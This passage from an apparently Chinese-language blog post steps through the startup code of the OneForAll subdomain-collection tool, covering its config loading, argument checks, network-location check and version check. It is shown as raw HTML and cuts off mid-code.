class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fire<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tmp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Example:</span><br><span class="hljs-string">        python ./tmp.py --target example run</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,target=<span class="hljs-literal">None</span></span>):</span><br>        self.target=target<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(self.target)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    fire.Fire(Tmp)<br></code></pre></div></td></tr></table></figure><p>结果如下</p><blockquote><p>python ./tmp.py</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">NAME<br>    tmp.<span class="hljs-keyword">py</span> - Example: <span class="hljs-keyword">python</span> ./tmp.<span class="hljs-keyword">py</span> --target example run<br><br>SYNOPSIS<br>    tmp.<span class="hljs-keyword">py</span> - COMMAND | VALUE<br><br>DESCRIPTION<br>    Example: <span class="hljs-keyword">python</span> ./tmp.<span class="hljs-keyword">py</span> --target example run<br><br>COMMANDS<br>    COMMAND <span class="hljs-keyword">is</span> one of the followin<span class="hljs-variable">g:</span><br><br>     run<br><br>VALUES   <br>    VALUE <span class="hljs-keyword">is</span> one of the followin<span class="hljs-variable">g:</span><br><br>     target<br></code></pre></div></td></tr></table></figure><p>python ./tmp.py –target hello run</p><p>hello</p></blockquote><p>对class OneForAll(object)进行分析，首先最初的字符串为命令提示内容，之后的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, target=<span class="hljs-literal">None</span>, targets=<span class="hljs-literal">None</span>, brute=<span class="hljs-literal">None</span>, dns=<span class="hljs-literal">None</span>, req=<span class="hljs-literal">None</span>,port=<span class="hljs-literal">None</span>, alive=<span class="hljs-literal">None</span>, fmt=<span class="hljs-literal">None</span>, path=<span class="hljs-literal">None</span>, takeover=<span class="hljs-literal">None</span></span>):</span><br>    self.target = target<br>    self.targets = targets<br>    self.brute = brute<br>    self.dns = dns<br>    self.req = req<br>    self.port = port<br>    self.alive = alive<br>    self.fmt = fmt<br>    self.path = path<br>    self.takeover = takeover<br>    self.domain = <span class="hljs-built_in">str</span>()  <span class="hljs-comment"># 当前正在收集的域</span><br>    self.domains = <span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 要收集的所有域</span><br>    self.data = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 当前域的子域结果</span><br>    self.datas = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 域的所有子域结果</span><br>    self.in_china = <span class="hljs-literal">None</span><br>    self.access_internet = <span class="hljs-literal">False</span><br>    self.enable_wildcard = <span class="hljs-literal">False</span><br></code></pre></div></td></tr></table></figure><h2 id="2-config-param函数"><a href="#2-config-param函数" class="headerlink" title="2. config_param函数"></a>2. config_param函数</h2><p>之后对于配置部分进行分析，代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">config_param</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Config parameter</span><br><span class="hljs-string">    配置参数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> self.brute <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.brute = <span class="hljs-built_in">bool</span>(settings.enable_brute_module)<br>    <span class="hljs-keyword">if</span> self.dns <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.dns = <span class="hljs-built_in">bool</span>(settings.enable_dns_resolve)<br>    <span class="hljs-keyword">if</span> self.req <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.req = <span class="hljs-built_in">bool</span>(settings.enable_http_request)<br>    <span class="hljs-keyword">if</span> self.takeover <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.takeover = <span class="hljs-built_in">bool</span>(settings.enable_takeover_check)<br>    <span class="hljs-keyword">if</span> self.port <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.port = settings.http_request_port<br>    <span class="hljs-keyword">if</span> self.alive <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.alive = <span class="hljs-built_in">bool</span>(settings.result_export_alive)<br>    <span class="hljs-keyword">if</span> self.fmt <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.fmt = settings.result_save_format<br>    <span class="hljs-keyword">if</span> self.path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.path = settings.result_save_path<br></code></pre></div></td></tr></table></figure><p>函数中首先是判断用户是否在输入时设置了对应参数，如果没有就全部设置为默认值</p><p>其中self是用户输入的内容设置，而settings是默认设置源自开始的</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> setting<br><span class="hljs-comment"># setting设置在config目录下的__init__.py中内容如下</span><br><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> default<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Settings</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 获取全局变量中的配置信息</span><br>        <span class="hljs-comment"># dir(default)获取当前范围内的变量、方法和定义的类型列表</span><br>        <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(default):<br>            <span class="hljs-comment"># 用于设置属性值，此处对self设置属性为attr的设置内容default中的内容</span><br>            <span class="hljs-built_in">setattr</span>(self, attr, <span class="hljs-built_in">getattr</span>(default, attr))<br>        setting_modules = [<span class="hljs-string">&#x27;config.setting&#x27;</span>, <span class="hljs-string">&#x27;config.api&#x27;</span>]<br>        <span class="hljs-keyword">for</span> setting_module <span class="hljs-keyword">in</span> setting_modules:<br>            <span class="hljs-comment"># 动态导入目录下setting，api中的内容</span><br>            setting = importlib.import_module(setting_module)<br>            <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(setting):<br>                <span class="hljs-built_in">setattr</span>(self, attr, <span class="hljs-built_in">getattr</span>(setting, attr))<br><br><br>settings = Settings()<br></code></pre></div></td></tr></table></figure><p>此处主要使用的函数是<code>dir()</code>,<code>setattr(object,attribute, value)</code>,<code>getattr(object,attribute)</code>,<code>importlib.import_module()</code></p><p><code>dir(文件名)</code>获得当前范围内的变量、方法和定义的类型列表</p><p><code>setattr(object,attribute, value)</code>对object中的attribute设置为value</p><p><code>getattr(object,attribute)</code>取出object中的attribute中的值</p><p><code>importlib.import_module(文件)</code>导入文件中的对象</p><p>示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># config目录下</span><br><span class="hljs-comment"># 1.__init__.py文件</span><br><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> default<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Settings</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 获取全局变量中的配置信息</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(default))<br>        <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(default):<br>            <span class="hljs-built_in">setattr</span>(self, attr, <span class="hljs-built_in">getattr</span>(default, attr))<br>        setting_modules = [<span class="hljs-string">&#x27;config.a&#x27;</span>]<br>        <span class="hljs-keyword">for</span> setting_module <span class="hljs-keyword">in</span> setting_modules:<br>            setting = importlib.import_module(setting_module)<br>            <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(setting):<br>                <span class="hljs-built_in">setattr</span>(self, attr, <span class="hljs-built_in">getattr</span>(setting, attr))<br><br><br>settings = Settings()<br><span class="hljs-comment"># 2. default.py 文件</span><br><span class="hljs-keyword">import</span> pathlib<br><span class="hljs-comment">## 获取当前路径位置,返回两次上级目录</span><br>now_dir=pathlib.Path(__file__).parent.parent<br><span class="hljs-comment">## 设置根目录下具体需要的目录</span><br>module_dir=now_dir.joinpath(<span class="hljs-string">&#x27;modules&#x27;</span>)<br><span class="hljs-comment">## 设置内容以备读取</span><br>lwx=<span class="hljs-string">&#x27;hello&#x27;</span><br><span class="hljs-comment"># 3. a.py 文件</span><br>bsms=<span class="hljs-string">&#x27;world&#x27;</span><br><span class="hljs-comment"># 同config文件夹下 tmp.py 文件</span><br><span class="hljs-keyword">import</span> fire<br><span class="hljs-keyword">from</span> one <span class="hljs-keyword">import</span> ou<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> settings<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tmp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Example:</span><br><span class="hljs-string">        python ./tmp.py --target example run</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,target=<span class="hljs-literal">None</span></span>):</span><br>        self.target=target<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(self.target)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    fire.Fire(Tmp)<br>    <span class="hljs-built_in">print</span>(settings.lwx+settings.bsms)<br>    <span class="hljs-built_in">print</span>(settings.module_dir)<br></code></pre></div></td></tr></table></figure><p>结果如下</p><blockquote><p>python ./tmp.py –target one run</p><p>one</p><p>helloworld</p><p>具体路径(C:\**\oneforall\modules)</p></blockquote><h2 id="3-check-param函数"><a href="#3-check-param函数" class="headerlink" title="3. check_param函数"></a>3. check_param函数</h2><p>现在对参数进行检查的部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_param</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查参数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> self.target <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.targets <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;You must provide either target or targets parameter&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><p>此处只是对目标(target)进行检查，如果不存在目标或目标列就记录且程序异常退出程序<code>exit(1)</code></p><h2 id="4-export-data函数"><a href="#4-export-data函数" class="headerlink" title="4. export_data函数"></a>4. export_data函数</h2><p>该部分是表示返回的数据内容</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_data</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Export data from the database</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :return: exported data</span><br><span class="hljs-string">    :rtype: list</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> export.export_data(self.domain, alive=self.alive, fmt=self.fmt, path=self.path)<br><br></code></pre></div></td></tr></table></figure><h2 id="5-run函数"><a href="#5-run函数" class="headerlink" title="5. run函数"></a>5. run函数</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    OneForAll running entrance</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :return: All subdomain results</span><br><span class="hljs-string">    :rtype: list</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(oneforall_banner)<br>    dt = datetime.now().strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] Starting OneForAll @ <span class="hljs-subst">&#123;dt&#125;</span>\n&#x27;</span>)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">&#x27;Python &#x27;</span> + utils.python_version())<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">&#x27;OneForAll &#x27;</span> + version)<br>    utils.check_dep()<br>    self.access_internet, self.in_china = utils.get_net_env()<br>    <span class="hljs-keyword">if</span> self.access_internet <span class="hljs-keyword">and</span> settings.enable_check_version:<br>        utils.check_version(version)<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Start running OneForAll&#x27;</span>)<br>    self.config_param()<br>    self.check_param()<br>    self.domains = utils.get_domains(self.target, self.targets)<br>    count = <span class="hljs-built_in">len</span>(self.domains)<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Got <span class="hljs-subst">&#123;count&#125;</span> domains&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> count:<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;Failed to obtain domain&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> self.domains:<br>        self.domain = utils.get_main_domain(domain)<br>        self.main()<br>    <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>        utils.export_all(self.alive, self.fmt, self.path, self.datas)<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Finished OneForAll&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>对代码进行简单的逐步分析</p><h3 id="5-1-check-dep函数"><a href="#5-1-check-dep函数" class="headerlink" title="5.1 check_dep函数"></a>5.1 check_dep函数</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 代码中前面部分是基本信息的输出</span><br><span class="hljs-comment"># 从正式的部分开始分析</span><br><span class="hljs-comment"># 其中utils是从目录common中导入的</span><br>utils.check_dep() <span class="hljs-comment"># 跟进函数check_dep()</span><br><span class="hljs-comment"># check_dep()</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_dep</span>():</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Checking dependent environment&#x27;</span>)<br>    <span class="hljs-comment"># 返回使用的python解释器</span><br>    implementation = platform.python_implementation()<br>    <span class="hljs-comment"># 返回使用的python版本号</span><br>    version = platform.python_version()<br>    <span class="hljs-comment"># 对返回的内容进行判断，是否满足需求</span><br>    <span class="hljs-comment"># python解释器是否为CPython</span><br>    <span class="hljs-keyword">if</span> implementation != <span class="hljs-string">&#x27;CPython&#x27;</span>:<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;OneForAll only passed the test under CPython&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># Python版本是否大于3.6</span><br>    <span class="hljs-keyword">if</span> LooseVersion(version) &lt; LooseVersion(<span class="hljs-string">&#x27;3.6&#x27;</span>):<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;OneForAll requires Python 3.6 or higher&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><h3 id="5-2-get-net-env函数"><a href="#5-2-get-net-env函数" class="headerlink" title="5.2 get_net_env函数"></a>5.2 get_net_env函数</h3><p>进一步对下一行代码进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># run()</span><br>self.access_internet, self.in_china = utils.get_net_env() <span class="hljs-comment"># 简单得出会返回两个值，分别为是否成功连接网络，是否在中国</span><br><span class="hljs-comment"># def get_net_env()</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_net_env</span>():</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Checking network environment&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用具体的检查网络的函数</span><br>        result = check_net()<br>    <span class="hljs-comment"># 对无法联网之后的进行记录，输出</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;Please check your network environment.&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-comment"># def check_net()</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_net</span>():</span><br>    <span class="hljs-comment"># 如下网站本身是获取用户具体地址等信息的但是国内无法访问？？？？</span><br>    urls = [<span class="hljs-string">&#x27;http://ipinfo.io/json&#x27;</span>, <span class="hljs-string">&#x27;http://ipconfig.io/json&#x27;</span>]<br>    <span class="hljs-comment"># 随机选择一个url地址</span><br>    url = random.choice(urls)<br>    <span class="hljs-comment"># 设置请求的参数等等</span><br>    header = &#123;<span class="hljs-string">&#x27;User_Agent&#x27;</span>: <span class="hljs-string">&#x27;curl&#x27;</span>&#125;<br>    timeout = settings.request_timeout_second<br>    <span class="hljs-comment"># verify表示的是：是否请求SSL验证(默认False)</span><br>    verify = settings.request_ssl_verify<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Trying to access <span class="hljs-subst">&#123;url&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># requests.Session()表示会话保持，即使用session成功的登录了某个网站，则在再次使用该session对象求求该网站的其他网页都会默认使用该session之前使用的cookie等参数</span><br>    session = requests.Session()<br>    <span class="hljs-comment"># 经过查询应该是不适用代理的意思</span><br>    session.trust_env = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">try</span>:<br>        rsp = session.get(url, headers=header, timeout=timeout, verify=verify)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;Unable to access Internet, retrying...&#x27;</span>)<br>        <span class="hljs-keyword">raise</span> e<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">&#x27;Access to Internet OK&#x27;</span>)<br>    country = rsp.json().get(<span class="hljs-string">&#x27;country&#x27;</span>).lower()<br>    <span class="hljs-comment"># 此处应该是判断是否在中国的程序，但是由于目标两个网站无法被墙，注定无法在中国了。。。。</span><br>    <span class="hljs-keyword">if</span> country <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;cn&#x27;</span>, <span class="hljs-string">&#x27;china&#x27;</span>]:<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;The computer is located in China&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;The computer is not located in China&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span><br></code></pre></div></td></tr></table></figure><p>经过实际测试，<code>http://ipconfig.io/json</code>偶尔能够访问，所以可以将地址替换为类似功能的地址<code>https://ifconfig.co/json</code>将原本的两个删除</p><h3 id="5-3-check-version函数"><a href="#5-3-check-version函数" class="headerlink" title="5.3 check_version函数"></a>5.3 check_version函数</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># run</span><br><span class="hljs-comment"># 此处是对于oneforall本身版本的检测 设置为联网时检测</span><br><span class="hljs-keyword">if</span> self.access_internet <span class="hljs-keyword">and</span> settings.enable_check_version:<br>    <span class="hljs-comment"># 检测oneforall的版本是否是最新版本</span><br>    utils.check_version(version)<br><span class="hljs-comment"># def check_version函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_version</span>(<span class="hljs-params">local</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">&#x27;Checking for the latest version&#x27;</span>)<br>    <span class="hljs-comment"># 需要访问的接口地址</span><br>    api = <span class="hljs-string">&#x27;https://api.github.com/repos/shmilylty/OneForAll/releases/latest&#x27;</span><br>    <span class="hljs-comment"># 此处是设置具体的请求头，基本同check_net中的设置</span><br>    <span class="hljs-comment"># 之后跟进对应get_random_header，get_proxy函数的具体生成</span><br>    header = get_random_header()<br>    proxy = get_proxy()<br>    timeout = settings.request_timeout_second<br>    verify = settings.request_ssl_verify<br>    session = requests.Session()<br>    session.trust_env = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 获取具体内容</span><br>        resp = session.get(url=api, 